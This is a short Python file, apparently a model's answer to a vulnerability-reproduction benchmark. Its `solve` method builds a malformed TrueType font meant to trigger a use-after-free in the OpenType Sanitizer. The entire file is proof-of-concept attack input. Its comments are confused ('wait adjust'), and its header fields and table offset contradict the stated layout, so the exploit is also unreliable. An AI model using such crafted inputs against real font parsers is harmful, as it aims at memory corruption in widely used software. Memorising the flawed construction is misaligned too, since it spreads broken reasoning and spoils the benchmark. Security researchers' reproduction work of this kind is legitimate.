class Solution:
    def solve(self, src_path: str) -> bytes:
        # Minimal malformed TTF to potentially trigger OTS parsing issues leading to UAF in Write
        poc = b'\x00\x01\x00\x00'  # sfnt version
        poc += b'\x00\x01\x00\x00'  # numTables=1, searchRange=0, entrySelector=0
        poc += b'\x00\x00\x00\x00'  # rangeShift=0
        # Table directory: one table, say 'head' with invalid data
        poc += b'head'  # tag
        poc += b'\x00\x00\x00\x00'  # checksum
        poc += b'\x00\x00\x10\x00'  # offset
        poc += b'\x00\x00\x00\x20'  # length=32
        # Table data at offset 16 (after header 12 + dir 16=28, wait adjust
        # Actually, header is 12 bytes, dir 16 per table, so for offset 16 it's overlapping, which might cause issues
        poc += b'\x00\x00\x01\x00'  # head table version
        poc += b'\x00\x00\x00\x00'  # fontRevision
        poc += b'\x00\x00\x00\x00'  # etc, fill to cause potential free/use
        poc += b'\x00' * (800 - len(poc))
        return poc